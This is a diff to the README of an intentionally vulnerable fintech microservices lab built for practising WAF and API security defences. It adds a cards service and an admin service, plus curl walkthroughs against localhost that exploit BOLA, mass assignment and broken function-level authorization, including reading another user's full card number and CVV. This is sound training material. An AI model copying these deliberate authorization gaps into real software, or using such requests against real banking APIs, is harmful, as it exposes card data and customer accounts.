@@ -3,15 +3,19 @@
 A deliberately-vulnerable fintech demo app, built to practice F5 Distributed
 Cloud (F5 XC) WAF and API Security features against: JWT validation at the
 edge, OpenAPI schema validation, rate limiting, and bot/malicious-user
-detection. **Phase 0 + Phase 1 + Phase 2 are done** — five independent FastAPI
-microservices (auth, accounts, transfers, kyc, support), each owning its own
+detection. **Phases 0–3 are done** — seven independent FastAPI microservices
+(auth, accounts, transfers, kyc, support, cards, admin), each owning its own
 Postgres database, fronted by a single Nginx gateway that also serves the
-React SPA. No rate limiting, no WAF, no schema enforcement anywhere — on
-purpose. Next up: point F5 XC at the gateway and layer those in.
+React SPA. Every service now also fires fire-and-forget request-log events to
+admin-service, which exposes a single live ops/traffic dashboard. No rate
+limiting, no WAF, no schema enforcement anywhere — on purpose. Next up: point
+F5 XC at the gateway and layer those in.
 
 Unlike [VulnCart](../vulncart) (a monolith bot-defense demo), NimbusBank is a
-true microservices split — five separate FastAPI services, five separate
-Postgres databases, **no cross-service database access, ever**. Services
+true microservices split — seven separate FastAPI services, seven separate
+Postgres databases, **no cross-service database access, ever** (admin-service
+aggregates only its own request-log table, never other services' data).
+Services
 that need to trust something about a request (who the caller is) do it the
 way F5 XC itself does: by validating a JWT's signature against a JWKS
 endpoint, not by reaching into another service's tables.
@@ -53,7 +57,12 @@ Summary, mapped to F5 XC's attack/feature categories:
 | IDOR — read any ticket + its messages / post to any ticket by sequential id | `services/support/app/main.py` (`get_ticket`, `post_message`) | API Security: Broken Object Level Authorization |
 | BFLA — `GET /tickets/all` agent console has no role check | `services/support/app/main.py` (`list_all_tickets`) | API Security: Broken Function Level Authorization |
 | Stored XSS / formjacking — ticket `body` rendered via `dangerouslySetInnerHTML` in the agent console | `services/support/app/models.py` + `frontend/src/pages/AgentConsole.jsx` | WAF / OWASP Top 10: Stored XSS |
-| No `limit_req` zone anywhere | `gateway/nginx.conf` | Unthrottled surface for every endpoint above |
+| BOLA / business-logic — issue a card against a funding account you don't own (no ownership check on `account_id`) | `services/cards/app/main.py` (`issue_card`) | API Security: BOLA / business-logic flaw |
+| BOLA + excessive data exposure — read any card by sequential id, full PAN + CVV returned | `services/cards/app/main.py` (`get_card`) | API Security: Broken Object Level Authorization + Sensitive Data Exposure |
+| Mass assignment + BOLA — PATCH sets any of `spend_limit_cents`/`status`/`account_id`/`user_id` on any card, no ownership check | `services/cards/app/main.py` (`update_card`) | API Security: Mass Assignment + BOLA |
+| BOLA — freeze/unfreeze anyone's card by id, no ownership check | `services/cards/app/main.py` (`freeze_card`, `unfreeze_card`) | API Security: Broken Object Level Authorization |
+| BFLA — staff traffic overview uses `get_current_user`, not `require_admin`; any customer reaches it | `services/admin/app/main.py` (`overview`) | API Security: Broken Function Level Authorization |
+| No `limit_req` zone anywhere (including the new `/api/cards/` and `/api/admin/` locations) | `gateway/nginx.conf` | Unthrottled surface for every endpoint above |
 
 What's **not** intentionally broken: passwords are bcrypt-hashed, access
 tokens are RS256-signed and verified against a real JWKS (not just decoded
@@ -64,10 +73,13 @@ XC is built to catch — not an exhaustive appsec audit.
 
 A note on the two kinds of comment in this codebase: `INTENTIONALLY
 VULNERABLE` marks a real gap you're meant to exploit and later fix with F5
-XC. `LAB-ONLY` (e.g. the OTP being echoed back in `/login`'s response body)
-marks a convenience that exists purely so you don't need to stand up a mail
-server to exercise the flow — it's not a security property and isn't part
-of the vulnerability table above.
+XC. `LAB-ONLY` (e.g. the OTP being echoed back in `/login`'s response body,
+or admin-service's `GET /admin/traffic` observability view being open with no
+authentication so you can watch traffic during testing without first building
+an admin login) marks a convenience that exists purely so you don't need to
+stand up extra infrastructure to exercise the flow — it's not a security
+property and isn't part of the vulnerability table above. (The *authenticated*
+`GET /admin/overview`, by contrast, **is** a real BFLA gap and is in the table.)
 
 ## Try the gaps by hand
 
@@ -253,6 +265,66 @@ curl -s -o /dev/null -w "%{http_code}\n" \
 # -> 401: accounts (and auth, transfers, kyc) validate exp correctly
 ```
 
+**Cards BOLA — issue a card against a funding account you don't own** (the full
+gateway path is `/api/cards/cards/...` — the repeated `cards` is correct, same
+URL shape as accounts/transfers):
+
+```bash
+# Alice's token, but fund the card off carol's checking account (id 7). No
+# ownership check on account_id — the card is accepted.
+curl -s -X POST http://localhost/api/cards/cards \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"account_id": 7, "card_type": "virtual"}' | jq
+```
+
+**Cards BOLA + sensitive data exposure — read any card by id, full PAN + CVV:**
+
+```bash
+curl -s http://localhost/api/cards/cards/2 -H "Authorization: Bearer $TOKEN" | jq
+# a card you don't own (seeded id 2 belongs to bob) — the response includes the
+# full 16-digit card_number and the cvv, not just last4
+```
+
+**Cards mass assignment — raise your spend limit sky-high (or reassign a card):**
+
+```bash
+curl -s -X PATCH http://localhost/api/cards/cards/1 \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"spend_limit_cents": 999999999}' | jq .spend_limit_cents
+# => 999999999 — no allowlist, no ownership check; user_id/account_id are
+# mass-assignable here too
+```
+
+**Cards BOLA — freeze someone else's card:**
+
+```bash
+curl -s -X POST http://localhost/api/cards/cards/3/freeze -H "Authorization: Bearer $TOKEN" | jq .status
+# => "frozen" — card id 3 is carol's, frozen by a token that isn't hers
+curl -s -X POST http://localhost/api/cards/cards/3/unfreeze -H "Authorization: Bearer $TOKEN" | jq .status
+```
+
+**Admin BFLA — reach the staff traffic overview as a plain customer:**
+
+```bash
+curl -s http://localhost/api/admin/admin/overview -H "Authorization: Bearer $TOKEN" | jq
+# => aggregate counts — 200 even though $TOKEN is a "customer", not an "admin"
+# (guarded by get_current_user, not require_admin)
+```
+
+**Cross-service request logging — watch traffic on the open ops view:**
+
+```bash
+# Every service posts a fire-and-forget log event to admin-service after each
+# request. /admin/traffic is LAB-ONLY open observability (no auth), so you can
+# just watch it:
+curl -s http://localhost/api/admin/admin/traffic | jq '{total, per_service, per_status_bucket}'
+curl -s http://localhost/api/admin/admin/traffic | jq '.recent[0:5]'
+# Logging is non-blocking: stop admin and services keep working normally.
+#   docker compose stop admin
+#   curl -s http://localhost/api/cards/cards -H "Authorization: Bearer $TOKEN"  # still 200
+#   docker compose start admin
+```
+
 ## Money movement, FX, and TOTP
 
 These are real features layered on top of the deliberately-vulnerable core —
@@ -346,24 +418,39 @@ curl -s -X POST http://localhost/api/auth/login/totp/verify -H "Content-Type: ap
 
 ## Stack
 
-- **Postgres 16**, one container, five databases: `auth`, `accounts`,
-  `transfers`, `kyc`, `support` — all in use as of Phase 2. Each service
-  connects to exactly one database and never touches another's.
+- **Postgres 16**, one container, seven databases: `auth`, `accounts`,
+  `transfers`, `kyc`, `support`, `cards`, `admin` — all in use as of Phase 3.
+  Each service connects to exactly one database and never touches another's.
 - **auth-service** (FastAPI, async SQLAlchemy + asyncpg) — users, login,
   OTP, and JWT/JWKS issuance. The only service holding the RS256 private
   key (2048-bit, generated on first boot, persisted in a docker volume).
 - **accounts-service** / **transfers-service** / **kyc-service** /
-  **support-service** (FastAPI) — validate bearer tokens by fetching
-  auth-service's public JWKS over the internal docker network; hold no
+  **support-service** / **cards-service** (FastAPI) — validate bearer tokens by
+  fetching auth-service's public JWKS over the internal docker network; hold no
   signing key of their own. (support-service deliberately skips the token's
   `exp` check — see its `security.py` and the vulnerability table.)
   kyc-service adds multipart file upload (`python-multipart`) and stores files
-  under `services/kyc/app/uploads/`.
+  under `services/kyc/app/uploads/`. cards-service issues payment cards funded
+  by accounts (the funding account is a logical reference only — no
+  cross-service FK or lookup).
+- **admin-service** (FastAPI) — the central request-log sink and ops-traffic
+  API. Every other service posts a fire-and-forget log event to its `/ingest`
+  after each request; `GET /admin/traffic` (open, LAB-ONLY) drives the live Ops
+  dashboard and `GET /admin/overview` is the authenticated (but role-unchecked,
+  BFLA) staff view. It aggregates only its own `request_logs` table and never
+  reads another service's database, so it deliberately does **not** depend on
+  auth at boot.
+- **request logging** — a tiny `obslog.py` copied per service adds an HTTP
+  middleware that fires the log POST via `asyncio.create_task` with a
+  short-timeout httpx client, wrapped so it can never block or fail the real
+  request. If admin-service is down the event is silently dropped and every
+  service keeps working normally.
 - **React** (Vite) — SPA, built and served as static files.
 - **Nginx** — single entry point: serves the built frontend and reverse
   proxies `/api/auth/`, `/api/accounts/`, `/api/transfers/`, `/api/kyc/`,
-  `/api/support/` to the five services. This is also where F5 XC slots in
-  later — point your XC origin pool at this Nginx, no app changes required.
+  `/api/support/`, `/api/cards/`, `/api/admin/` to the seven services. This is
+  also where F5 XC slots in later — point your XC origin pool at this Nginx, no
+  app changes required.
 
 A note on URL shape: each service's own routes already include their
 resource name (e.g. accounts-service defines `GET /accounts/{id}`, not just
@@ -392,6 +479,8 @@ correct; see `gateway/nginx.conf` and each service's `main.py`.
    curl http://localhost/api/transfers/health
    curl http://localhost/api/kyc/health
    curl http://localhost/api/support/health
+   curl http://localhost/api/cards/health
+   curl http://localhost/api/admin/health
    ```
 4. Visit `http://localhost/` in a browser: register an account (or sign in
    as one of the seeded users below), view your dashboard, open an account,
@@ -466,6 +555,14 @@ rows to leak. support-service seeds two tickets (ids 1-2: alice's card issue,
 bob's 2FA question) with a few messages each, so the customer view and the
 agent console aren't empty.
 
+cards-service seeds one virtual card per seeded customer — sequential ids 1-4:
+alice (funded by checking account 3), bob (account 5, `frozen`), carol
+(account 7), dave (account 9, `frozen`) — each with a random full PAN, CVV, and
+an expiry ~3 years out. So `GET /cards/cards/{1..4}` leaks a full PAN + CVV out
+of the box, and a couple start frozen for variety. admin-service seeds nothing:
+its `request_logs` table fills as soon as traffic flows, and the Ops dashboard
+(`/ops` in the UI, `GET /admin/traffic`) shows it live.
+
 All five seeded users stay on the weak echoed-OTP login path out of the box
 (`totp_enabled = false`) so the curl flows above keep working. Real
 authenticator-app (TOTP) enrollment is opt-in per user via the Security page
@@ -498,7 +595,12 @@ seeding convenience only, not a runtime dependency between the databases.
 8. ~~**Phase 5:** client-side defense / formjacking demo against the React
    frontend~~ — done, via the support agent console's raw-HTML render of
    customer-submitted ticket messages.
-9. **Phase 6:** an aggregated admin dashboard across all services.
+9. ~~**Phase 6:** an aggregated admin dashboard across all services~~ — done,
+   via `cards-service` plus `admin-service`: every service fires fire-and-forget
+   request-log events to admin-service's `/ingest`, and the React `/ops` console
+   renders a live cross-service traffic view off `GET /admin/traffic` (open,
+   LAB-ONLY) with `GET /admin/overview` as the authenticated-but-role-unchecked
+   (BFLA) staff variant.
 10. **Phase 7:** split across multiple environments for a realistic
     multi-environment F5 XC deployment (e.g. separate XC namespaces for
     auth vs. accounts/transfers).
